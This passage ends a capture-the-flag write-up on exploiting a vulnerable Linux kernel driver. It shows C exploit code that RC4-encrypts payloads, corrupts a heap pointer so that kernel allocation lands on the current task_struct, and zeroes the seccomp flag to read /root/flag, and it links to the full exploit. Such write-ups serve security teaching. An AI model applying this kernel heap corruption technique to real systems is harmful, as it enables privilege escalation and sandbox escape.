+<span class="giallo-l"><span>		j </span><span style="color: #94E2D5;">+=</span><span> state</span><span style="color: #9399B2;">-&gt;</span><span>perm</span><span style="color: #9399B2;">[</span><span>i</span><span style="color: #9399B2;">]</span><span style="color: #94E2D5;"> +</span><span> key</span><span style="color: #9399B2;">[</span><span>i </span><span style="color: #94E2D5;">%</span><span> keylen</span><span style="color: #9399B2;">];</span><span> </span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">		swap_bytes</span><span style="color: #9399B2;">(</span><span style="color: #94E2D5;">&amp;</span><span>state</span><span style="color: #9399B2;">-&gt;</span><span>perm</span><span style="color: #9399B2;">[</span><span>i</span><span style="color: #9399B2;">],</span><span style="color: #94E2D5;"> &amp;</span><span>state</span><span style="color: #9399B2;">-&gt;</span><span>perm</span><span style="color: #9399B2;">[</span><span>j</span><span style="color: #9399B2;">]);</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">	}</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">static void</span><span style="color: #89B4FA;font-style: italic;"> rc4_crypt</span><span style="color: #9399B2;">(</span><span style="color: #CBA6F7;">struct</span><span> rc4_state </span><span style="color: #94E2D5;">*</span><span style="color: #CBA6F7;">const</span><span style="color: #EBA0AC;font-style: italic;"> state</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;"> const unsigned char</span><span style="color: #94E2D5;"> *</span><span style="color: #EBA0AC;font-style: italic;">inbuf</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;"> unsigned char</span><span style="color: #94E2D5;"> *</span><span style="color: #EBA0AC;font-style: italic;">outbuf</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;"> int</span><span style="color: #EBA0AC;font-style: italic;"> buflen</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">{</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	int</span><span> i</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	unsigned char</span><span> j</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	for</span><span style="color: #9399B2;"> (</span><span>i </span><span style="color: #94E2D5;">=</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">;</span><span> i </span><span style="color: #94E2D5;">&lt;</span><span> buflen</span><span style="color: #9399B2;">;</span><span> i</span><span style="color: #94E2D5;">++</span><span style="color: #9399B2;">) {</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>		state</span><span style="color: #9399B2;">-&gt;</span><span>index1</span><span style="color: #94E2D5;">++</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>		state</span><span style="color: #9399B2;">-&gt;</span><span>index2</span><span style="color: #94E2D5;"> +=</span><span> state</span><span style="color: #9399B2;">-&gt;</span><span>perm</span><span style="color: #9399B2;">[</span><span>state</span><span style="color: #9399B2;">-&gt;</span><span>index1</span><span style="color: #9399B2;">];</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">		swap_bytes</span><span style="color: #9399B2;">(</span><span style="color: #94E2D5;">&amp;</span><span>state</span><span style="color: #9399B2;">-&gt;</span><span>perm</span><span style="color: #9399B2;">[</span><span>state</span><span style="color: #9399B2;">-&gt;</span><span>index1</span><span style="color: #9399B2;">],</span></span>
+<span class="giallo-l"><span style="color: #94E2D5;">		    &amp;</span><span>state</span><span style="color: #9399B2;">-&gt;</span><span>perm</span><span style="color: #9399B2;">[</span><span>state</span><span style="color: #9399B2;">-&gt;</span><span>index2</span><span style="color: #9399B2;">]);</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>		j </span><span style="color: #94E2D5;">=</span><span> state</span><span style="color: #9399B2;">-&gt;</span><span>perm</span><span style="color: #9399B2;">[</span><span>state</span><span style="color: #9399B2;">-&gt;</span><span>index1</span><span style="color: #9399B2;">]</span><span style="color: #94E2D5;"> +</span><span> state</span><span style="color: #9399B2;">-&gt;</span><span>perm</span><span style="color: #9399B2;">[</span><span>state</span><span style="color: #9399B2;">-&gt;</span><span>index2</span><span style="color: #9399B2;">];</span></span>
+<span class="giallo-l"><span>		outbuf</span><span style="color: #9399B2;">[</span><span>i</span><span style="color: #9399B2;">]</span><span style="color: #94E2D5;"> =</span><span> inbuf</span><span style="color: #9399B2;">[</span><span>i</span><span style="color: #9399B2;">]</span><span style="color: #94E2D5;"> ^</span><span> state</span><span style="color: #9399B2;">-&gt;</span><span>perm</span><span style="color: #9399B2;">[</span><span>j</span><span style="color: #9399B2;">];</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">	}</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">static void</span><span style="color: #89B4FA;font-style: italic;"> get</span><span style="color: #9399B2;">(</span><span style="color: #CBA6F7;">char</span><span style="color: #94E2D5;"> *</span><span style="color: #EBA0AC;font-style: italic;">payload</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;"> int</span><span style="color: #EBA0AC;font-style: italic;"> len</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;"> char</span><span style="color: #94E2D5;">*</span><span style="color: #EBA0AC;font-style: italic;"> outbuf</span><span style="color: #9399B2;">){</span><span> </span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	struct</span><span> rc4_state state</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">	rc4_init</span><span style="color: #9399B2;">(</span><span style="color: #94E2D5;">&amp;</span><span>state</span><span style="color: #9399B2;">,</span><span> key_buf</span><span style="color: #9399B2;">,</span><span style="color: #89B4FA;font-style: italic;"> strlen</span><span style="color: #9399B2;">(</span><span>key_buf</span><span style="color: #9399B2;">));</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">	rc4_crypt</span><span style="color: #9399B2;">(</span><span style="color: #94E2D5;">&amp;</span><span>state</span><span style="color: #9399B2;">,</span><span> payload</span><span style="color: #9399B2;">,</span><span> outbuf</span><span style="color: #9399B2;">,</span><span> len</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #9399B2;">}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">static void</span><span style="color: #89B4FA;font-style: italic;"> send_enc</span><span style="color: #9399B2;">(</span><span style="color: #CBA6F7;">void</span><span style="color: #94E2D5;"> *</span><span style="color: #EBA0AC;font-style: italic;">payload</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;"> int</span><span style="color: #EBA0AC;font-style: italic;"> len</span><span style="color: #9399B2;">){</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	char</span><span style="color: #94E2D5;"> *</span><span> res </span><span style="color: #94E2D5;">=</span><span style="color: #89B4FA;font-style: italic;"> malloc</span><span style="color: #9399B2;">(</span><span>len</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">	get</span><span style="color: #9399B2;">(</span><span>payload</span><span style="color: #9399B2;">,</span><span> len</span><span style="color: #9399B2;">,</span><span> res</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">	create_buf</span><span style="color: #9399B2;">(</span><span>len</span><span style="color: #9399B2;">,</span><span> res</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">	free</span><span style="color: #9399B2;">(</span><span>res</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">}</span></span>
+<span class="giallo-l"></span></code></pre>
+<p>The last function <code>send_enc</code> receives a payload, encrypts it with our key and sends it to the driver. In addition to that, we have a <code>payload_t</code> struct that has 0x10 bytes, to make it easier to concatenate data:</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="c"><span class="giallo-l"><span style="color: #CBA6F7;">struct</span><span style="color: #F9E2AF;font-style: italic;"> payload_t</span><span style="color: #9399B2;">{</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	unsigned long</span><span> addr</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	unsigned long</span><span> pad</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">};</span></span></code></pre>
+<p>Now that we have a loop, we can send <code>current</code> address and a padding of 8 bytes to reach size 16, this will get written on the next pointer in the heap.</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="c"><span class="giallo-l"><span style="color: #CBA6F7;">	struct</span><span style="color: #F9E2AF;font-style: italic;"> payload_t</span><span> curr </span><span style="color: #94E2D5;">=</span><span style="color: #9399B2;"> {</span></span>
+<span class="giallo-l"><span>		.addr </span><span style="color: #94E2D5;">=</span><span> current</span><span style="color: #9399B2;">,</span></span>
+<span class="giallo-l"><span>		.pad </span><span style="color: #94E2D5;">=</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">4141414141414141</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">	};</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">	send_enc</span><span style="color: #9399B2;">(</span><span style="color: #94E2D5;">&amp;</span><span style="color: #EBA0AC;font-style: italic;">curr</span><span style="color: #9399B2;">,</span><span style="color: #94E2D5;"> sizeof</span><span style="color: #9399B2;">(</span><span style="color: #CBA6F7;">struct</span><span style="color: #F9E2AF;font-style: italic;"> payload_t</span><span style="color: #9399B2;">));</span><span> </span></span></code></pre><pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="c"><span class="giallo-l"><span style="color: #94E2D5;">/</span><span>home</span><span style="color: #94E2D5;">/</span><span>user $ </span><span style="color: #94E2D5;">/</span><span>chall</span><span style="color: #94E2D5;">/</span><span>run </span></span>
+<span class="giallo-l"><span style="color: #9399B2;">[</span><span style="color: #94E2D5;">*</span><span style="color: #9399B2;">]</span><span> Opened device</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">[</span><span style="color: #94E2D5;">!</span><span style="color: #9399B2;">]</span><span> The key is �</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">[</span><span style="color: #94E2D5;">*</span><span style="color: #9399B2;">]</span><span> task_struct current : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">ffff88803dbb4140</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">[</span><span style="color: #94E2D5;">*</span><span style="color: #9399B2;">]</span><span> PID : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">7b</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>gef</span><span style="color: #94E2D5;">&gt;</span><span> x</span><span style="color: #94E2D5;">/</span><span>4gx</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">ffff88803db71930</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">ffff88803db71930</span><span>:	</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">4141414141414141</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">4141414141414141</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">ffff88803db71940</span><span>:	</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">ffff88803dbb4140</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">4141414141414141</span></span></code></pre>
+<p>After the last kmalloc:</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="c"><span class="giallo-l"><span>gef</span><span style="color: #94E2D5;">&gt;</span><span> x $rax</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">ffff88803dbb4140</span><span>:	</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0000000000000000</span></span>
+<span class="giallo-l"></span></code></pre>
+<p>It is already 0 because of <code>kzalloc</code>, but after the encryption it will get filled with data. We just have to send our 0's encrypted again, and we will successfully zero out <code>_TIF_SECCOMP</code> flag, making it possible to read the flag.</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="c"><span class="giallo-l"><span style="color: #CBA6F7;">static void</span><span style="color: #89B4FA;font-style: italic;"> cat_flag</span><span style="color: #9399B2;">(){</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	int</span><span> f </span><span style="color: #94E2D5;">=</span><span style="color: #89B4FA;font-style: italic;"> open</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;">&quot;/root/flag&quot;</span><span style="color: #9399B2;">,</span><span> O_RDONLY</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	if</span><span style="color: #9399B2;"> (</span><span>f </span><span style="color: #94E2D5;">&lt;</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">){</span><span style="color: #89B4FA;font-style: italic;">perror</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;">&quot;flag not found&quot;</span><span style="color: #9399B2;">);</span><span style="color: #89B4FA;font-style: italic;"> exit</span><span style="color: #9399B2;">(</span><span style="color: #FAB387;">1</span><span style="color: #9399B2;">);}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	char</span><span> flagbuf</span><span style="color: #9399B2;">[</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">40</span><span style="color: #9399B2;">]</span><span style="color: #94E2D5;"> =</span><span style="color: #9399B2;"> {</span><span style="color: #FAB387;">0</span><span style="color: #9399B2;">};</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">	read</span><span style="color: #9399B2;">(</span><span>f</span><span style="color: #9399B2;">,</span><span> flagbuf</span><span style="color: #9399B2;">,</span><span style="color: #94E2D5;"> sizeof</span><span style="color: #9399B2;">(</span><span>flagbuf</span><span style="color: #9399B2;">));</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">	printf</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;">&quot;[*] Flag: %s&quot;</span><span style="color: #9399B2;">,</span><span> flagbuf</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">	close</span><span style="color: #9399B2;">(</span><span>f</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">}</span></span></code></pre>
+<p>Now we go back to <code>run.sh</code> and enable <code>kaslr</code> to make sure it works with every protection.</p>
+<h2 id="getting-the-flag">Getting the flag</h2>
+<p><img src="/assets/kerbab/flag.gif" alt="flag" /></p>
+<h2 id="solvers">Solvers</h2>
+<ul>
+<li>RC4 bruteforcer: <a href="/assets/kerbab/rc4.py">rc4.py</a></li>
+<li>Final exploit: <a href="/assets/kerbab/exploit.c">exploit.c</a></li>
+<li>VM start script: <a href="/assets/kerbab/run.sh">run.sh</a></li>
+<li>Challenge files: <a href="/assets/kerbab/kerbab.zip">kerbab.zip</a></li>
+</ul>
+
+  </div>
+</section>
+
+    </main>
+    <hr>
+    <footer>
+      <p>© 2026 Jorge Moreno Cano. Powered by <a href="https://www.getzola.org/">Zola</a>, you can download the theme <a href="https://github.com/mxaddict/zolanight">here</a></p>
+    </footer>
+  </body>
+</html>
